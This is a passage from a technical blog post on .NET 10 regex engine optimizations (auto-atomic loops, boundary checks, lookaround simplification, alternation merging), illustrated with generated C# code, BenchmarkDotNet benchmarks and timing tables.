<code>UnicodeCategory.ModiferLetter</code>, <code>UnicodeCategory.DecimalDigitNumber</code>, and <code>UnicodeCategory.ConnectorPunctuation</code>). Note that none of those eight categories is the same as <code>\p{Sm}</code>, which means they&rsquo;re disjoint, which means we can safely change that loop to being atomic without impacting behavior; it just makes it faster. One of the easiest ways to see the effect of this is to look at the output from the regex source generator. Before the change, if I look at the XML comment generated for that expression, I get this:</p><pre><code>/// &#9675; Match a word character greedily any number of times. /// &#9675; Match a character in the set [\p{Sm}].</code></pre><p>and after, I get this:</p><pre><code>/// &#9675; Match a word character atomically any number of times. /// &#9675; Match a character in the set [\p{Sm}].</code></pre><p>That one word change in the first sentence makes a huge difference. Here&rsquo;s the relevant portion of the C# code emitted by the source generator for the matching routine before the change:</p><pre><code>// Match a word character greedily any number of times. //{ charloop_starting_pos = pos; int iteration = 0; while ((uint)iteration &lt; (uint)slice.Length &amp;&amp; Utilities.IsWordChar(slice[iteration])) { iteration++; } slice = slice.Slice(iteration); pos += iteration; charloop_ending_pos = pos; goto CharLoopEnd; CharLoopBacktrack: if (Utilities.s_hasTimeout) { base.CheckTimeout(); } if (charloop_starting_pos &gt;= charloop_ending_pos) { return false; // The input didn't match. } pos = --charloop_ending_pos; slice = inputSpan.Slice(pos); CharLoopEnd: //}</code></pre><p>You can see how backtracking influences the emitted code. The core loop in there is iterating through as many word characters as it can match, but then before moving on, it remembers some position information about where it was. It also sets up a label for where subsequent code should jump to if it needs to backtrack; that code undoes one of the matched characters and then retries everything that came after it. If the code needs to backtrack again, it&rsquo;ll again undo one of the characters and retry. And so on. Now, here&rsquo;s what the code looks like after the change:</p><pre><code>// Match a word character atomically any number of times. { int iteration = 0; while ((uint)iteration &lt; (uint)slice.Length &amp;&amp; Utilities.IsWordChar(slice[iteration])) { iteration++; } slice = slice.Slice(iteration); pos += iteration; }</code></pre><p>All of that backtracking gunk is gone; the loop matches as much as it can, and that&rsquo;s that. You can see the effect this has one some cases with a micro-benchmark like this:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new string(' ', 100); private static readonly Regex s_regex = new Regex(@"\s+\S+", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre><p>This is a simple test where we&rsquo;re trying to match any positive number of whitespace characters followed by any positive number of non-whitespace characters, giving it an input composed entirely of whitespace. Without atomicity, the engine is going to consume all of the whitespace as part of the <code>\s+</code> but will then find that there isn&rsquo;t any non-whitespace available to match the <code>\S+</code>. What does it do then? It backtracks, gives back one of the hundred spaces consumed by <code>\s+</code>, and tries again to match the <code>\S+</code>. It won&rsquo;t match, so it backtracks again. And again. And again. A hundred times, until it has nothing left to try and gives up. With atomicity, all that backtracking goes away, allowing it to fail faster.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>183.31 ns</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>69.23 ns</td> <td>0.38</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/117892">dotnet/runtime#117892</a> is a related improvement. In regex, <code>\b</code> is called a &ldquo;word boundary&rdquo;; it checks whether the wordness of the previous character (whether the previous character matches <code>\w</code>) matches the wordness of the next character, calling it a boundary if they differ. You can see this in the engine&rsquo;s <code>IsBoundary</code> helper&rsquo;s implementation, which follows (note that according to <a href="http://www.unicode.org/reports/tr18/">TR18</a> whether a character is considered a boundary word char is <em>almost</em> exactly the same as <code>\w</code>, except with two additional zero-width Unicode characters also included):</p><pre><code>internal static bool IsBoundary(ReadOnlySpan<char> inputSpan, int index) { int indexM1 = index - 1; return ((uint)indexM1 &lt; (uint)inputSpan.Length &amp;&amp; RegexCharClass.IsBoundaryWordChar(inputSpan[indexM1])) != ((uint)index &lt; (uint)inputSpan.Length &amp;&amp; RegexCharClass.IsBoundaryWordChar(inputSpan[index])); }</char></code></pre><p>The optimizer already had a special-case in its auto-atomicity logic that had knowledge of boundaries and their relationship to <code>\w</code> and <code>\d</code>, specifically. So, if you had <code>\w+\b</code>, the optimizer would recognize that in order for the <code>\b</code> to match, what comes after what the <code>\w+</code> matches must necessarily not match <code>\w</code>, because then it wouldn&rsquo;t be a boundary, and thus the <code>\w+</code> could be made atomic. Similarly, with a pattern of <code>\d+\b</code>, it would recognize that what came after must not be in <code>\d</code>, and could make the loop atomic. It didn&rsquo;t generalize this, though. Now in .NET 10, it does. This PR teaches the optimizer how to recognize subsets of <code>\w</code>, because, as with the special-case of <code>\d</code>, any subset of <code>\w</code> can similarly benefit: if what comes before the <code>\b</code> is a word character, what comes after must not be. Thus, with this PR, an expression like <code>[a-zA-Z]+\b</code> will now have the loop made atomic.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = "Supercalifragilisticexpialidocious1"; private static readonly Regex s_regex = new Regex(@"^[A-Za-z]+\b", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>116.57 ns</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>21.74 ns</td> <td>0.19</td> </tr> </tbody> </table><p>Just doing a better job of set disjointedness analysis is helpful, but more so is actually recognizing whole new classes of things that can be made atomic. In prior releases, the auto-atomicity optimizations only kicked in for loops over single characters, e.g. <code>a*</code>, <code>[abc]*?</code>, <code>[^abc]*</code>. That is obviously only a subset of loops, as many loops are composed of more than just a single character; loops can surround any regex construct. Even a capture group thrown into the mix would knock the auto-atomicity behavior off the rails. Now with <a href="https://github.com/dotnet/runtime/pull/117943">dotnet/runtime#117943</a>, a significant number of loops involving more complicated constructs can be made atomic. Loops larger than a single character are tricky, though, as there are more things that need to be taken into account when reasoning through atomicity. With a single character, we only need to prove disjointedness for that one character with what comes after it. But, consider an expression like <code>([a-z][0-9])+a1</code>. Can that loop be made atomic? What comes after the loop (<code>'a'</code>) is provably disjoint from what ends the loop (<code>[0-9]</code>), and yet making this loop atomic automatically would change behavior and be a no-no. Imagine if the input were <code>"b2a1"</code>. That matches; if this expression is processed normally, the loop would match a single iteration, consuming the <code>"b2"</code>, and then the <code>a1</code> after the loop would consume the corresponding <code>a1</code> in the input. But, if the loop were made atomic, e.g. <code>(?&gt;([a-z][0-9])+)a1</code>, the loop would end up performing two iterations and consuming both the <code>"b2"</code> and the <code>"a1"</code>, leaving nothing for the <code>a1</code> in the pattern. As it turns out, we not only need to ensure what ends the loop is disjoint from what comes after it, we also need to ensure that what starts the loop is disjoint from what comes after it. That&rsquo;s not all, though. Now consider an expression <code>^(a|ab)+$</code>. This matches an entire input composed of <code>"a"</code>s and <code>"ab"</code>s. Given an input string like <code>"aba"</code>, this will match successfully, as it will consume the <code>"ab"</code> with the second branch of the alternation, and then consume the remaining <code>a</code> with the first branch of the alternation on the next iteration of the loop. But now consider what happens if we make the loop atomic: <code>^(?&gt;(a|ab)+)$</code>. Now on that same input, the initial <code>a</code> in the input will be consumed by the first branch of the alternation, and that will satisfy the loop&rsquo;s minimum bound of 1 iteration, exiting the loop. It&rsquo;ll then proceed to validate that it&rsquo;s at the end of the string, and fail, but with the loop now atomic, there&rsquo;s nothing to backtrack into, and the whole match fails. Oops. The problem here is that the loop&rsquo;s ending must not only be disjoint with what comes next, and the loop&rsquo;s beginning must not only be disjoint with what comes next, but because it&rsquo;s a loop, what comes next can actually be itself, which means the loop&rsquo;s beginning and ending must be disjoint from each other. Those criteria significantly limit to what patterns this can be applied, but even with that, it&rsquo;s still surprisingly common: <code>dotnet/runtime-assets</code> (which contains test assets for use with <code>dotnet/runtime</code>) contains a <a href="https://github.com/dotnet/runtime-assets/blob/f9ac0b368d930728d6740686de29b5276958d15b/src/System.Text.RegularExpressions.TestData/Regex_RealWorldPatterns.json">database of regex patterns</a> sourced from appropriately-licensed nuget packages, yielding almost 20,000 unique patterns, and more than 7% of those were positively impacted by this.</p><p>Here is an example that&rsquo;s searching <a href="https://www.gutenberg.org/cache/epub/3200/pg3200.txt">&ldquo;The Entire Project Gutenberg Works of Mark Twain&rdquo;</a> for sequences of all lowercase ASCII words, each followed by a space, and then all followed by an uppercase ASCII letter.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"([a-z]+ )+[A-Z]", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre><p>In previous releases, that inner loop would be made atomic, but the outerloop would remain greedy (backtracking). From the XML comment generated by the source generator, we get this:</p><pre><code>/// &#9675; Loop greedily at least once. /// &#9675; 1st capture group. /// &#9675; Match a character in the set [a-z] atomically at least once. /// &#9675; Match ' '. /// &#9675; Match a character in the set [A-Z].</code></pre><p>Now in .NET 10, we get this:</p><pre><code>/// &#9675; Loop atomically at least once. /// &#9675; 1st capture group. /// &#9675; Match a character in the set [a-z] atomically at least once. /// &#9675; Match ' '. /// &#9675; Match a character in the set [A-Z].</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>573.4 ms</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>504.6 ms</td> <td>0.88</td> </tr> </tbody> </table><p>As with any optimization, auto-atomicity should never change observable behavior; it should just make things faster. And as such, every case where atomicity is automatically applied requires it being reasoned through to ensure that the optimization is of sound logic. In some cases, the optimization was written to be conservative, as the relevant reasoning through the logic wasn&rsquo;t previously done. An example of that is addressed by <a href="https://github.com/dotnet/runtime/pull/118191">dotnet/runtime#118191</a>, which makes a few tweaks to how boundaries are handled in the auto-atomicity logic, removing some constraints that were put in place but which, as it turns out, are unnecessary. The core logic that implements the atomicity analysis is a method that looks like this:</p><pre><code>private static bool CanBeMadeAtomic(RegexNode node, RegexNode subsequent, ...)</code></pre><p><code>node</code> is the representation for the part of the regex that&rsquo;s being considered for becoming atomic (e.g. a loop) and <code>subsequent</code> is what comes immediately after it in the pattern; the method then proceeds to validate <code>node</code> against <code>subsequent</code> to see whether it can prove there wouldn&rsquo;t be any behavioral changes if <code>node</code> were made atomic. However, not all cases are sufficiently handled just by validating against <code>subsequent</code> itself. Consider a pattern like <code>a*b*\w</code>, where <code>node</code> represents <code>a*</code> and <code>subsequent</code> represents <code>b*</code>. <code>a</code> and <code>b</code> are obviously disjoint, and so <code>node</code> can be made atomic with regards to <code>subsequent</code>, but&hellip; here <code>subsequent</code> is also &ldquo;nullable,&rdquo; meaning it might successfully match 0 characters (the loop has a lower bound of 0). And in such a case, what comes after the <code>a*</code> won&rsquo;t necessarily be a <code>b</code> but could be what comes after the <code>b*</code>, which here is a <code>\w</code>, which overlaps with <code>a</code>, and as such, it would be a behavioral change to make this into <code>(?&gt;a*)b*\w</code>. Consider an input of just <code>"a"</code>. With the original pattern, <code>a*</code> would successfully match the empty string with 0 iterations, <code>b*</code> would successfully match the empty string with 0 iterations, and then <code>\w</code> would successfully match the input <code>'a'</code>. But with the atomicized pattern, <code>(?&gt;a*)</code> would successfully match the input <code>'a'</code> with a single iteration, leaving nothing to match the <code>\w</code>. As such, when <code>CanBeMadeAtomic</code> detects that <code>subsequent</code> may be nullable and successfully match the empty string, it needs to iterate to also validate against what comes after <code>subsequent</code> (and possibly again and again if what comes next itself keeps being nullable).</p><p><code>CanBeMadeAtomic</code> already factored in boundaries (<code>\b</code> and <code>\B</code>), but it did so with the conservative logic that since a boundary is &ldquo;zero-width&rdquo; (meaning it doesn&rsquo;t consume any input), it must always require checking what comes after it. But that&rsquo;s not actually the case. Even though a boundary is zero-width, it still makes guarantees about what comes next: if the prior character is a word character, the next is guaranteed to not be with a successful match. And as such, we can safely make this more liberal and not require checking what comes next.</p><p>This last example also highlights an interesting aspect of this auto-atomicity optimization in general. There is nothing this optimization provides that the developer writing the regex in the first place couldn&rsquo;t have done themselves. Instead of <code>a*b</code>, a developer can write <code>(?&gt;a*)b</code>. Instead of <code>[a-z]+(?= )</code>, a developer can write <code>(?&gt;[a-z]+)(?= )</code>. And so on. But when was the last time you explicitly added an atomic group to a regex you authored? Of the almost 20,000 regular expression patterns in the aforementioned database of real-world regexes sourced from nuget, care to guess how many include an explicitly written atomic group? The answer: ~100. It&rsquo;s just not something developers in general think to do, so although the optimization transforms the user&rsquo;s pattern into something they could have written themselves, it&rsquo;s an incredibly valuable optimization, especially since now in .NET 10 over 70% of those patterns have at least one construct upgraded to be atomic.</p><p>The auto-atomicity optimization is an example of the optimizer removing unnecessary work. A key example of that, but certainly not the only example. Several additional PRs in .NET 10 have also eliminated unnecessary work, in other ways.</p><p><a href="https://github.com/dotnet/runtime/pull/118084">dotnet/runtime#118084</a> is a fun example of this, but to understand it, we first need to understand lookarounds. A &ldquo;lookaround&rdquo; is a regex construct that makes its contents zero-width. Whereas when a set like &ldquo;[abc]&rdquo; matches it consumes a single character from the input, or when a loop like &ldquo;[abc]{3,5}&rdquo; matches it&rsquo;ll consume between 3-5 characters from the input, lookarounds (as with other zero-width constructs, like anchors) don&rsquo;t consume anything. You wrap a lookaround around a regex expression, and it effectively makes the consumption temporary, e.g. if I wrap <code>[abc]{3,5}</code> in a positive lookahead as <code>(?=[abc]{3,5})</code>, that will end up performing the whole match for the 3-5 set characters, but those characters won&rsquo;t remain consumed after exiting the lookaround; the lookaround is just performing a test to ensure the inner pattern matches but the position in the input is reset upon exiting the lookaround. This is again visualized easily by looking at the code emitted by the regex source generator for a pattern like <code>(?=[abc]{3,5})abc</code>:</p><pre><code>// Zero-width positive lookahead. { int positivelookahead_starting_pos = pos; // Match a character in the set [a-c] atomically at least 3 and at most 5 times. { int iteration = 0; while (iteration &lt; 5 &amp;&amp; (uint)iteration &lt; (uint)slice.Length &amp;&amp; char.IsBetween(slice[iteration], 'a', 'c')) { iteration++; } if (iteration &lt; 3) { return false; // The input didn't match. } slice = slice.Slice(iteration); pos += iteration; } pos = positivelookahead_starting_pos; slice = inputSpan.Slice(pos); } // Match the string "abc". if (!slice.StartsWith("abc")) { return false; // The input didn't match. }</code></pre><p>We can see that the lookaround is caching the starting position, then proceeding to try to match the loop it contains, and if successful, resetting the matching position to what it was when the lookaround was entered, then continuing on to perform the match for what comes after the lookaround.</p><p>These examples have been for a particular flavor of lookaround, called a positive lookahead. There are four variations of lookarounds composed of two choices: positive vs negative, and lookahead vs lookbehind. Lookaheads validate the pattern starting from the current position and proceeding forwards (as matching typically is), while lookbehinds validate the pattern starting from just before the current position and extending backwards. Positive indicates that the pattern should match, while negative indicates that the pattern should not match. So, for example, the negative lookbehind <code>(? will match if what comes before the current position is not a word character.</code></p><p>Negative lookarounds are particularly interesting, because, unlike every other regex construct, they guarantee that the pattern they contain <em>doesn&rsquo;t</em> match. That also makes them special in other regards, in particular around capture groups. For a positive lookaround, even though they&rsquo;re zero width, anything capture groups inside of the lookaround capture still remain to outside of the lookaround, e.g. <code>^(?=(abc))\1$</code>, which entails a backreference successfully matching what&rsquo;s captured by the capture group inside of the positive lookahead, will successfully match the input <code>"abc"</code>. But because <em>negative</em> lookarounds guarantee their content doesn&rsquo;t match, it would be counter-intuitive if anything captured inside of a negative lookaround persisted past the lookaround&hellip; so it doesn&rsquo;t. The capture groups inside of a negative lookaround are still possibly meaningful, in particular if there&rsquo;s a backreference also <em>inside of</em> the same lookaround that refers back to the capture group, e.g. the pattern <code>^(?!(ab)\1cd)ababc</code> is checking to see whether the input does not begin with <code>ababcd</code> but does begin with <code>ababc</code>. But if there&rsquo;s no backreference, the capture group is useless, and we don&rsquo;t need to do any work for it as part of processing the regex (work like remembering where the capture occurred). Such capture groups can be completely eliminated from the node tree as part of the optimization phase, and that&rsquo;s exactly what <a href="https://github.com/dotnet/runtime/pull/118084">dotnet/runtime#118084</a> does. Just as developers often use backtracking constructs without thinking to make them atomic, developers also often use capture groups purely as a grouping mechanism without thinking of the possibility of making them non-capturing groups. Since captures in general need to persist to be examined by the <code>Match</code> object returned from a <code>Regex</code>, we can&rsquo;t just eliminate all capture groups that aren&rsquo;t used internally in the pattern, but we can for these negative lookarounds. Consider a pattern like <code>(?, which is looking for the word <code>"token"</code> when it&rsquo;s <em>not</em> preceeded by <code>"access "</code> or <code>"auth "</code>; the developer here (me, in this case) did what&rsquo;s fairly natural, putting a group around the alternation so that the <code>\s</code> that follows either word can be factored out (if it were instead <code>access|auth\s</code>, the whitespace set would only be in the second branch of the alternation and wouldn&rsquo;t apply to the first). But my &ldquo;simple&rdquo; grouping here is actually a capture group by default; to get it to be non-capturing, I&rsquo;d either need to write it as a non-capturing group, i.e. <code>(?, or I&rsquo;d need to use <code>RegexOptions.ExplicitCapture</code>, which turns all non-named capture groups into non-capturing groups.</code></code></p><p>We can similarly remove other work related to lookarounds. As noted, positive lookarounds exist to transform any pattern into a zero-width pattern, i.e. don&rsquo;t consume anything. That&rsquo;s all they do. If the pattern being wrapped by the positive lookaround is already zero-width, the lookaround contributes nothing to the behavior of the expression and can be removed. So, for example, if you have <code>(?=$)</code>, that can be transformed into just <code>$</code>. That&rsquo;s exactly what <a href="https://github.com/dotnet/runtime/pull/118091">dotnet/runtime#118091</a> does.</p><p><a href="https://github.com/dotnet/runtime/pull/118079">dotnet/runtime#118079</a> and <a href="https://github.com/dotnet/runtime/pull/118111">dotnet/runtime#118111</a> handle other transformations relative to zero-width assertions, in particular with regards to loops. For whatever reason, you&rsquo;ll see developers wrapping zero-width assertions inside of loops, either making such assertions optional (e.g. <code>\b?</code>) or with some larger upper bound (e.g. <code>(?=abc)*</code>). But these zero-width assertions don&rsquo;t consume anything; their sole purpose is to flag whether something is true or false at the current position. If you make such a zero-width assertion optional, then you&rsquo;re saying &ldquo;check whether it&rsquo;s true or false, and then immediately ignore the answer, because both answers are valid&rdquo;; as such, the whole expression can be removed as a nop. Similarly, if you wrap a loop with an upper bound greater than 1 around such an expression, you&rsquo;re saying &ldquo;check whether it&rsquo;s true or false, now without changing anything check again, and check again, and check again.&rdquo; There&rsquo;s a common English expression that&rsquo;s something along the lines of &ldquo;insanity is doing the same thing over and over again and expecting different results.&rdquo; That applies here. There may be behavioral benefits to invoking the zero-width assertion once, but repeating it beyond that is a pure waste: if it was going to fail, it would have failed the first time. Mostly. There&rsquo;s one specific case where the difference is actually observable, and that has to do with an interesting feature of .NET regexes: capture groups track <em>all</em> matched captures, not just the last. Consider this program:</p><pre><code>// dotnet run -c Release -f net10.0 using System.Diagnostics; using System.Text.RegularExpressions; Match m = Regex.Match("abc", "^(?=(\\w+)){3}abc$"); Debug.Assert(m.Success); foreach (Group g in m.Groups) { foreach (Capture c in g.Captures) { Console.WriteLine($"Group: {g.Name}, Capture: {c.Value}"); } }</code></pre><p>If you run that, you may be surprised to see that capture group #1 (the explicit group I have inside of the lookahead) provides three capture values:</p><pre><code>Group: 0, Capture: abc Group: 1, Capture: abc Group: 1, Capture: abc Group: 1, Capture: abc</code></pre><p>That&rsquo;s because the loop around the positive lookahead does three iterations, each iteration matches <code>"abc"</code>, and each successful capture is persisted for subsequent inspection via the <code>Regex</code> APIs. As such, we can&rsquo;t optimize any loop around zero-width assertions by lowering the upper bound from greater than 1 to 1; we can only do so if it doesn&rsquo;t contain any captures. And that&rsquo;s what these PRs do. Given a loop that wraps a zero-width assertion that does not contain a capture, if the lower bound of the loop is 0, the whole loop and its contents can be eliminated, and if the upper bound of the loop is greater than 1, the loop itself can be removed, leaving only its contents in its stead.</p><p>Any time work like this is eliminated, it&rsquo;s easy to construct monstrous, misleading micro-benchmarks&hellip; but it&rsquo;s also a lot of fun, so, I&rsquo;ll allow myself it this time.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"(?=.*\bTwain\b.*\bConnecticut\b)*.*Mark", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>3,226.024 ms</td> <td>1.000</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>6.605 ms</td> <td>0.002</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/118083">dotnet/runtime#118083</a> is similar. &ldquo;Repeaters&rdquo; are a name for a regex loop that has the same lower and upper bound, such that the contents of the loop &ldquo;repeats&rdquo; that fixed number of times. Typically you&rsquo;ll see these written out using the <code>{N}</code> syntax, e.g. <code>[abc]{3}</code> is a repeater that requires three characters, any of which can be <code>'a'</code>, <code>'b'</code>, or <code>'c'</code>. But of course it could also be written out in long-form, just by manually repeating the contents, e.g. <code>[abc][abc][abc]</code>. Just as we saw how we can condense loops around zero-width assertions when specified in loop form, we can do the exact same thing when manually written out. So, for example, <code>\b\b</code> is the same as just <code>\b{2}</code>, which is just <code>\b</code>.</p><p>Another nice example of removing unnecessary work is <a href="https://github.com/dotnet/runtime/pull/118105">dotnet/runtime#118105</a>. Boundary assertions are used in many expressions, e.g. it&rsquo;s quite common to see a simple pattern like <code>\b\w+\b</code>, which is trying to match an entire word. When the regex engine encounters such an assertion, historically it&rsquo;s delegated to the <code>IsBoundary</code> helper shown earlier. There is, however, some subtle unnecessary work here, which is more obvious when you see what the regex source generator outputs for an expression like <code>\b\w+\b</code>. This is what the output looks like on .NET 9:</p><pre><code>// Match if at a word boundary. if (!Utilities.IsBoundary(inputSpan, pos)) { return false; // The input didn't match. } // Match a word character atomically at least once. { int iteration = 0; while ((uint)iteration &lt; (uint)slice.Length &amp;&amp; Utilities.IsWordChar(slice[iteration])) { iteration++; } if (iteration == 0) { return false; // The input didn't match. } slice = slice.Slice(iteration); pos += iteration; } // Match if at a word boundary. if (!Utilities.IsBoundary(inputSpan, pos)) { return false; // The input didn't match. }</code></pre><p>Pretty straightforward: match the boundary, consume as many word characters as possible, then again match a boundary. Except if you look back at the definition of <code>IsBoundary</code>, you&rsquo;ll notice that it&rsquo;s doing two checks, one against the previous character and one against the next character.</p><pre><code>internal static bool IsBoundary(ReadOnlySpan<char> inputSpan, int index) { int indexM1 = index - 1; return ((uint)indexM1 &lt; (uint)inputSpan.Length &amp;&amp; RegexCharClass.IsBoundaryWordChar(inputSpan[indexM1])) != ((uint)index &lt; (uint)inputSpan.Length &amp;&amp; RegexCharClass.IsBoundaryWordChar(inputSpan[index])); }</char></code></pre><p>Now, look at that, and look back at the generated code, and look at this again, and back at the source generated code again. See anything unnecessary? When we perform the first boundary comparison, we are dutifully checking the previous character, which is necessary, but then we&rsquo;re checking the current character, which is about to checked against <code>\w</code> by the subsequent <code>\w+</code> loop. Similarly for the second boundary check, we just finished matching <code>\w+</code>, which will have only successfully matched if there was at least one word character. While we still need to validate that the subsequent character is not a boundary character (there are two characters considered boundary characters that aren&rsquo;t word characters), we don&rsquo;t need to re-validate the previous character. So, <a href="https://github.com/dotnet/runtime/pull/118105">dotnet/runtime#118105</a> overhauls boundary handling in the compiler and source generator to emit customized boundary checks based on surrounding knowledge. If it can prove that the subsequent construct will validate that a character is a word character, then it only needs to validate that the previous character is not a boundary character; similarly, if it can prove that the previous construct will have already validated that a character is a word character, then it only needs to validate that the next character isn&rsquo;t. This leads to this tweaked source generated code now on .NET 10:</p><pre><code>// Match if at a word boundary. if (!Utilities.IsPreWordCharBoundary(inputSpan, pos)) { return false; // The input didn't match. } // Match a word character atomically at least once. { int iteration = 0; while ((uint)iteration &lt; (uint)slice.Length &amp;&amp; Utilities.IsWordChar(slice[iteration])) { iteration++; } if (iteration == 0) { return false; // The input didn't match. } slice = slice.Slice(iteration); pos += iteration; } // Match if at a word boundary. if (!Utilities.IsPostWordCharBoundary(inputSpan, pos)) { return false; // The input didn't match. }</code></pre><p>Those <code>IsPreWordCharBoundary</code> and <code>IsPostWordCharBoundary</code> helpers are just half the checks in the main boundary helper. In cases where there are lots of boundary tests being performed, the reduced check count can add up.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"\ba\b", RegexOptions.Compiled | RegexOptions.IgnoreCase); [Benchmark] public int CountStandaloneAs() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>CountStandaloneAs</td> <td>.NET 9.0</td> <td>20.58 ms</td> <td>1.00</td> </tr> <tr> <td>CountStandaloneAs</td> <td>.NET 10.0</td> <td>19.25 ms</td> <td>0.94</td> </tr> </tbody> </table><p>The <code>Regex</code> optimizer is all about pattern recognition: it looks for sequences and shapes it recognizes and performs transforms over those to put them into a more efficiently-processable form. One example of this is with alternations around coalescable branches. Let&rsquo;s say you have an alternation <code>a|e|i|o|u</code>. You could process that as an alternation, but it&rsquo;s also much more efficiently represented and processed as the equivalent set <code>[aeiou]</code>. There is an optimization that does such transformations as part of handling alternations. However, through .NET 9, it only handled single characters and sets, but not negated sets. For example, it would transform <code>a|e|i|o|u</code> into <code>[aeiou]</code>, and it would transform <code>[aei]|[ou]</code> into <code>[aeiou]</code>, but it would not merge negations like <code>[^\n]</code>, otherwise known as <code>.</code> (when not in <code>RegexOptions.Singleline</code> mode). When developers want a set that represents all characters, there are various idioms they employ, such as <code>[\s\S]</code>, which says &ldquo;this is a set of all whitespace and non-whitespace characters&rdquo;, aka everything. Another common idiom is <code>\n|.</code>, which is the same as <code>\n|[^\n]</code>, which says &ldquo;this is an alternation that matches either a newline or anything other than a newline&rdquo;, aka also everything. Unfortunately, while examples like <code>[\d\D]</code> have been handled well, <code>.|\n</code> has not, because of the gap in the alternation optimization. <a href="https://github.com/dotnet/runtime/pull/118109">dotnet/runtime#118109</a> improves that, such that such &ldquo;not&rdquo; cases are mergable as part of the existing optimization. That takes a relatively expensive alternation and converts it into a super fast set check. And while, in general, set containment checks are very efficient, this one is as efficient as you can get, as it&rsquo;s always true. We can see an example of this with a pattern intended to match C-style comment blocks.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private const string Input = """ /* This is a comment. */ /* Another comment */ /* Multi-line comment */ """; private static readonly Regex s_regex = new Regex(@"/\*(?:.|\n)*?\*/", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(Input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>344.80 ns</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>93.59 ns</td> <td>0.27</td> </tr> </tbody> </table><p>Note that there&rsquo;s another change that helps .NET 10 here, <a href="https://github.com/dotnet/runtime/pull/118373">dotnet/runtime#118373</a>, though I hesitate to call it out as a performance improvement since it&rsquo;s really more of a bug fix. As part of writing this post, these benchmark numbers were showing some oddities (it&rsquo;s important in general to be skeptical of benchmark results and to investigate anything that doesn&rsquo;t align with reason and expectations). The result of investigating was a one-word change that yielded significant speedups on this test, specifically when using <code>RegexOptions.Compiled</code> (the bug didn&rsquo;t exist in the source generator). As part of handling lazy loops, there&rsquo;s a special-case for when the lazy loop is around a set that matches any character, which, thanks to the previous PR, <code>(?:.|\n)</code> now does. That special-case recognizes that if the lazy loop matches anything, we can efficiently find the end of the lazy loop by searching for whatever comes after the loop (e.g. in this test, the loop is followed by the literal <code>"*/"</code>). Unfortunately, the helper that emits that <code>IndexOf</code> call was passed the wrong node from the pattern: it was being passed the object representing the <code>(?:.|\n)</code> any-set 